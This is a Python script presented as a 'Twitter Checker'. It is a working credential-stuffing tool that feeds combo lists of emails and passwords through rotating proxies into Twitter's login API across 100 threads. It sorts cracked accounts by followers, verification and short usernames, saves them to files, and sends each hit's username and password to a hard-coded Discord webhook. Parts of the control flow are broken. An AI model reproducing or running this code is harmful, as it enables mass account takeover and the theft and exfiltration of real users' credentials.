from requests import Session, exceptions
from random import choice, random,sample
from easygui import fileopenbox
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore,init
from console.utils import set_title
from threading import Thread, Lock
from time import sleep, strftime,gmtime,time
from os import mkdir, path,  system, name
from discord_webhook import DiscordWebhook,DiscordEmbed
import json
jsonfile = """{
    "threads": 100,
    "bad": {
    "print": false,
    "Save": false
    },
    "proxy": {
    "type": "socks5"
    },
    "2fa": {
    "SendtoDiscordWebhook": true,
    "Print": false
    },
    "WebhookDiscord": {
    "enable": true,
    "DiscordWebhook": "https://ptb.discord.com/api/webhooks/954902065639981068/NDn_Z14Z56p4ZNfxPIfch8dJErrw116H-EWLRa4b9Bkj2pfSB0v5_J_LSlpODoB9NoXH",
    "Footer": {
        "text": "Twitter Checker By Turki",
        "iconurl": "https://l.top4top.io/p_2273oe2s82.jpg"
    },
    "2facolor": "FFFF00",
    "hitscolor": "00FF00"
    }
}
"""
if path.exists("settings.json"):
 options = json.loads(open("settings.json",'r').read())
else:
 options = open("settings.json",'w').write(jsonfile)



letters = "qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM123456789"
class Counter:
    checked = 0
    hits = 0
    bad = 0
    cpm = 0
    twoFa = 0 
    SFA = 0
    gif = 0
    GoodUsername = 0
    verifed = 0
    k10followers = 0
    k50followers = 0
    k100follwers = 0
    error = 0

class Main():
 def __init__(self):
    self.stop_time = True
    self.accounts = []
    self.proxylist = []    
    self.folder = ''
    self.start_time = 0
    self.comboload()
    self.proxyload()
    self.resultfolder()
    Thread(target=self.counter, daemon=True).start()
    self.start_checker()
    input("> You Can Exit Know")
 def prep(self, line):
  if ':' in line:
     email, password = line.split(':', 1)
     line = f'{email}:{password}'
     self.startchecker(username=email,password=password)
  else:
   Counter.checked += 1
   Counter.bad += 1   
   return
 def comboload(self):
    while True:
             print(f"{cyan}Please Import Your Combo List")
             sleep(0.3)
             loader = open(fileopenbox(title="Load Combo List", default="*.txt"), 'r', encoding="utf8",errors='ignore').read().split('\n')
             self.accounts = [x.strip() for x in loader if x != '']
             if len(self.accounts) == 0:
                    print(f'{red}No combo found!, Please make sure file have combos...\n')
                    continue
             print(f"{magenta} > Imported {len(self.accounts)} lines")
             break
        
               
 def proxyload(self):
     while True:
          print(f"\n{cyan}Please Import Your Proxies List")
          sleep(0.3)
          loader = open(fileopenbox(title="Load Proxies List", default="*.txt"), 'r', encoding="utf8",   errors='ignore').read().split('\n')
          self.proxylist = list(set([x.strip() for x in loader]))
          print(f"{magenta} > Imported {len(self.proxylist)} proxies from File")
          break

 def resultfolder(self):
        unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
        self.folder = f'results/{unix}'
        if not path.exists('results'):
            mkdir('results')
        if not path.exists(self.folder):
            mkdir(self.folder)

 def start_checker(self):
        
        threads = Settings.threads
        mainpool = ThreadPool(processes=threads)
        clear()
        self.start_time = time()
        Thread(target=self.title).start()
        mainpool.imap_unordered(func=self.prep, iterable=self.accounts)
        mainpool.close()
        mainpool.join()
       
        print(f"""
- Hits: {Counter.hits}
- Bad: {Counter.bad}
- 2FA: {Counter.twoFa}
- Special: {Counter.GoodUsername}
- SFA: {Counter.SFA}
- GIF: {Counter.gif}
- Verifed: {Counter.verifed}
- 10KFollowers: {Counter.k10followers}
- 50KFollowers: {Counter.k50followers}
-100KFollowers: {Counter.k100follwers}
- Errors: {Counter.error}
- {self.now_time()} Elapsed """)
        self.stop_time = False
       
 def counter(self):
  while self.stop_time:
   if Counter.checked >= 1:
    now = Counter.checked
    sleep(3)
    Counter.cpm = (Counter.checked - now) * 20

 def title(self):
        while self.stop_time:
                set_title(
                    f" | Hits: {Counter.hits}"
                    f" - Bad: {Counter.bad}"
                    f'{"" if Counter.twoFa == 0 else f" - 2FA: {Counter.twoFa}"}'
                    f'{"" if Counter.SFA == 0 else f" - SFA: {Counter.SFA}"}'
                    f'{"" if Counter.gif == 0 else f" - GIF: {Counter.gif}"}'
                    f'{"" if Counter.GoodUsername == 0 else f" - Spu: {Counter.GoodUsername}"}'
                    f'{"" if Counter.verifed == 0 else f" - Verifed: {Counter.verifed}"}'
                    f"{'' if Counter.k10followers == 0 else f' - 10KFollowers: {Counter.k10followers}'}"
                    f"{'' if Counter.k50followers == 0 else f' - 50KFollowers: {Counter.k50followers}'}"
                     f"{'' if Counter.k100follwers == 0 else f' - 100KFollowers: {Counter.k100follwers}'}"
                    f"{'' if Counter.error == 0 else f' | Errors: {Counter.error}'}"
                    f" | Left: {len(self.accounts) - Counter.checked}/{len(self.accounts)}"
                    f'{f"Proxies: {len(self.proxylist)}"}'
                    f' | CPM: {Counter.cpm}'
                    f' | {self.now_time()} Elapsed')

 def now_time(self):
        return strftime("%H:%M:%S", gmtime(time() - self.start_time))
 def startchecker(self,username,password): 
  proxy = choice(self.proxylist)
  if Settings.proxytype == 'http' or Settings.proxytype == 'https':
    proxys = {'http': f"http://{proxy}", 'https': f"https://{proxy}"}
  elif Settings.proxytype == 'socks4' or Settings.proxytype == 'socks5':
       line = f"{Settings.proxytype}://{proxy}"
       proxys = {'http': line, 'https': line}
  try:
       req = Session()
       accesheaders = {
              "Authorization": "Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw=="
              }
       accespayload = {
              "grant_type": "client_credentials"
              }
       accesstokenreq = req.post("https://api.twitter.com/oauth2/token",data=accespayload,headers=accesheaders,proxies=proxys,timeout=5).json()
       access_token = accesstokenreq["access_token"]
       guestheaders = {
              "Authorization": "Bearer " + access_token
              }
       guesttokenreq = req.post("https://api.twitter.com/1.1/guest/activate.json",headers=guestheaders,proxies=proxys,timeout=5).json()
       guest_token = guesttokenreq["guest_token"]

       loginheaders = {
              "Authorization": f"Bearer {access_token}",
              "X-Guest-Token": guest_token,
              "User-Agent": "TwitterAndroid/8.19.0-release.01 (18190001-r-1) LGM-V300K/5.1.1 (LGE;LGM-V300K;Android;LGM-V300K;0;;1;2014)",
              "X-Twitter-Client-DeviceID": "".join(sample(letters,15)),
                     "X-Twitter-Client-Language": "en-US",
                     "X-Twitter-Client": "TwitterAndroid",
                     "X-Twitter-API-Version": "5",
                     "Optimize-Body": "true",
                     "X-Twitter-Active-User": "yes",
                     "X-Twitter-Client-Version": "8.19.0-release.01",
                     "X-Guest-UUID": "".join(sample(letters,16)),
                     "Accept": "application/json",
              }
       logindata = {
              "x_auth_identifier": username,
              "x_auth_password": password,
              "send_error_codes": "true",
              "x_auth_login_challenge": "1",
              "x_auth_country_code": "US"
              }
      
     
     
       loginrequest = req.post("https://api.twitter.com/auth/1/xauth_password.json",headers=loginheaders,proxies=proxys,data=logindata,timeout=7).json()
      
       if "errors" in loginrequest:
              for codes in loginrequest["errors"]:
                     if codes['code'] == 243:
                            return self.startchecker(username=username,password=password)  
                     if codes['code'] == 32:
                            if Settings.printbad == True:
                             print(red + f'{username}:{password}'+ " " +'[bad]')
                             if Settings.savebad == True:
                              open(f'{self.folder}/bad.txt', 'a', encoding='u8').write(f'\n{username}:{password}')
                            Counter.bad += 1
                            Counter.checked += 1
       elif "login_verification_user_id" in loginrequest:
          iprequests = req.get("https://api.myip.com/", proxies=proxys).json()
          ip  = iprequests["ip"]
          ipcountry  = iprequests["country"]
          requestsgrabberingheaders = {
       "Authorization": "Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F"
       }
       userid = loginrequest["login_verification_user_id"]
       test = req.get(f"https://api.twitter.com/graphql/FRRB-roWdcG2bdd6zarvHA/UserByIdQuery?variables=%7B%22includeAdsSubscription%22%3Atrue%2C%22includeHighlightedLabel%22%3Afalse%2C%22rest_id%22%3A%22{userid}%22%7D",headers=requestsgrabberingheaders,proxies=proxys).json()
       datagrabbering = test["data"]["user"]["legacy"]
       date = datagrabbering["created_at"][26:30]
       isverifyed = datagrabbering["verified"]
       typeaccount = '2fa'
       if isverifyed == True:
              isverifyed = 'true'
       else:
        isverifyed = 'false'
       if datagrabbering["profile_image_url_https"].endswith("gif") == True:
              isGif = 'true'
       else: 
              isGif = 'false'
       Faisal = f"""Orignal Combo: {username}:{password}
       is verifyed? : {isverifyed}
       Created Account Date: {date}
       ollowers: {datagrabbering["followers_count"]}
       username: {datagrabbering["screen_name"]}
       is Gif?: {datagrabbering["profile_image_url_https"].endswith("gif")}
       Ip: {ip}
       Country: {ipcountry}
       """
       if Webhook.enable == True:
              if Settings.twofauctorSendToDiscord == True:
               webhook = DiscordWebhook(url=Webhook.Discordurl)
               embed = DiscordEmbed()
               embed.set_author(name="New Hits.!", url=f'https://twitter.com/{datagrabbering["screen_name"]}', icon_url='https://l.top4top.io/p_2273oe2s82.jpg')
               embed.set_thumbnail(url=datagrabbering["profile_image_url_https"])
               embed.add_embed_field(name='Orignal Combo', value=f'{username}:{password}')
               embed.add_embed_field(name='is Verify?', value=isverifyed)
               embed.add_embed_field(name='Created At?', value=date)
               embed.add_embed_field(name="Username:", value=datagrabbering["screen_name"])
               embed.add_embed_field(name="is End With Gif?", value=isGif)
               embed.add_embed_field(name="Followers:", value=datagrabbering["followers_count"])
               embed.add_embed_field(name="Type Account?",value=typeaccount)
               embed.set_color(Webhook.twofauctorcolor)
               embed.set_footer(text=Webhook.textfooter, icon_url=Webhook.iconfooter)
               webhook.add_embed(embed)
               response = webhook.execute()
              open(f"{self.folder}/Orignalcombo.txt",'a').write(f"'{username}:{password}")
       if typeaccount == '2fa':
              Counter.checked += 1
              Counter.hits += 1
              Counter.twoFa += 1
              if Settings.printtwofauctor == True:
               print(yellow + f'[2FA] {username}:{password}')
              open(f'{self.folder}/2fa.txt', 'a', encoding='u8').write(f'{Faisal}---------------------------------------\n')
       if datagrabbering["profile_image_url_https"].endswith("gif") == True:
              Counter.gif += 1
              open(f'{self.folder}/gif.txt', 'a', encoding='u8').write(f'\n{Faisal}---------------------------------------\n')
       if len(datagrabbering["screen_name"]) <= 4:
              Counter.GoodUsername += 1
              open(f'{self.folder}/SpecialUsername.txt', 'a', encoding='u8').write(f'\n{Faisal}---------------------------------------\n')
       if datagrabbering["verified"] == True:
              Counter.verifed +=1
              open(f'{self.folder}/verify.txt', 'a', encoding='u8').write(f'\n{Faisal}---------------------------------------\n')

       elif "oauth_token" in loginrequest:
              iprequests = req.get("https://api.myip.com/", proxies=proxys).json()
              ip  = iprequests["ip"]
              ipcountry  = iprequests["country"]
              userid = loginrequest["user_id"]
              test = req.get(f"https://api.twitter.com/graphql/FRRB-roWdcG2bdd6zarvHA/UserByIdQuery?variables=%7B%22includeAdsSubscription%22%3Atrue%2C%22includeHighlightedLabel%22%3Afalse%2C%22rest_id%22%3A%22{userid}%22%7D",headers=requestsgrabberingheaders,proxies=proxys).json()
              datagrabbering = test["data"]["user"]["legacy"]
              date = datagrabbering["created_at"][26:30]
              isverifyed = datagrabbering["verified"]
              typeaccount = '2fa'
              if isverifyed == True:
                     isverifyed = 'true'
              else:
               isverifyed = 'false'
              if datagrabbering["profile_image_url_https"].endswith("gif") == True:
                     isGif = 'true'
              else: 
                     isGif = 'false'
              Faisal = f"""Orignal Combo: {username}:{password}
              is verifyed? : {isverifyed}
              Created Account Date: {date}
              ollowers: {datagrabbering["followers_count"]}
              username: {datagrabbering["screen_name"]}
              is Gif?: {datagrabbering["profile_image_url_https"].endswith("gif")}
              Ip: {ip}
              Country: {ipcountry}
              """
              if Webhook.enable == True:
               webhook = DiscordWebhook(url=Webhook.Discordurl)
               embed = DiscordEmbed()
               embed.set_author(name="New Hits.!", url=f'https://twitter.com/{datagrabbering["screen_name"]}', icon_url='https://l.top4top.io/p_2273oe2s82.jpg')
               embed.set_thumbnail(url=datagrabbering["profile_image_url_https"])
               embed.add_embed_field(name='Orignal Combo', value=f'{username}:{password}')
               embed.add_embed_field(name='is Verify?', value=isverifyed)
               embed.add_embed_field(name='Created At?', value=date)
               embed.add_embed_field(name="Username:", value=datagrabbering["screen_name"])
               embed.add_embed_field(name="is End With Gif?", value=isGif)
               embed.add_embed_field(name="Followers:", value=datagrabbering["followers_count"])
               embed.add_embed_field(name="Type Account?",value=typeaccount)
               embed.set_color(Webhook.hitscolor)
               embed.set_footer(text=Webhook.textfooter, icon_url=Webhook.iconfooter)
               webhook.add_embed(embed)
              open(f"{self.folder}/Orignalcombo.txt",'a').write(f"'{username}:{password}")
              if typeaccount == 'sfa':
                     Counter.checked += 1
                     Counter.hits += 1
                     Counter.twoFa += 1
                     print(green + f'[sfa] {username}:{password}')
                     open(f'{self.folder}/SFA.txt', 'a', encoding='u8').write(f'{Faisal}---------------------------------------\n')
              if datagrabbering["profile_image_url_https"].endswith("gif") == True:
                     Counter.gif += 1
                     open(f'{self.folder}/gif.txt', 'a', encoding='u8').write(f'{Faisal}---------------------------------------\n')
              if len(datagrabbering["screen_name"]) < 4:
                     Counter.GoodUsername += 1
                     open(f'{self.folder}/SpecialUsername.txt', 'a', encoding='u8').write(f'{Faisal}---------------------------------------\n')
              if datagrabbering["verified"] == True:
                     Counter.verifed +=1
                     open(f'{self.folder}/verify.txt', 'a', encoding='u8').write(f'{Faisal}---------------------------------------\n')
              else:
                     print(f'{username}:{password} Can\'t Find The status please Checked !P')
  
  except exceptions.ConnectionError or exceptions.Timeout as Turki:
   return self.startchecker(username,password)
         

              

         


 

class Settings:
 threads = int(options["threads"])
 printbad = bool(options["bad"]["print"])
 savebad = bool(options["bad"]["Save"])
 proxytype = str(options["proxy"]["type"]).lower()
 twofauctorSendToDiscord = bool(options["2fa"]["SendtoDiscordWebhook"])
 printtwofauctor =  bool(options["2fa"]["Print"])

class Webhook:
 enable = bool(options["WebhookDiscord"]["enable"])
 Discordurl = str(options["WebhookDiscord"]["DiscordWebhook"])
 textfooter = str(options["WebhookDiscord"]["Footer"]["text"])
 iconfooter = str(options["WebhookDiscord"]["Footer"]["iconurl"])
 twofauctorcolor = str(options["WebhookDiscord"]["2facolor"]).replace("#"," ")
 hitscolor = str(options["WebhookDiscord"]["hitscolor"]).replace("#"," ")
 



if __name__ == '__main__':
    
    clear = lambda: system('cls' if name == 'nt' else 'clear')
    print("Welcome to Twitter Checker")
    init(autoreset=True)
    yellow = Fore.LIGHTYELLOW_EX
    red = Fore.LIGHTRED_EX
    green = Fore.LIGHTGREEN_EX
    cyan = Fore.LIGHTCYAN_EX
    blue = Fore.LIGHTBLUE_EX
    white = Fore.LIGHTWHITE_EX
    magenta = Fore.LIGHTMAGENTA_EX
    charz = ['@', '!', '#', '$', '%', '^', '&', '*', ')', '(', '-', '}', '{', ']', '"', '+', '=', '?', '/',
             '.', '>', ',', '<', '`', '\'', '~', '[', '\\', ' ']
    Main()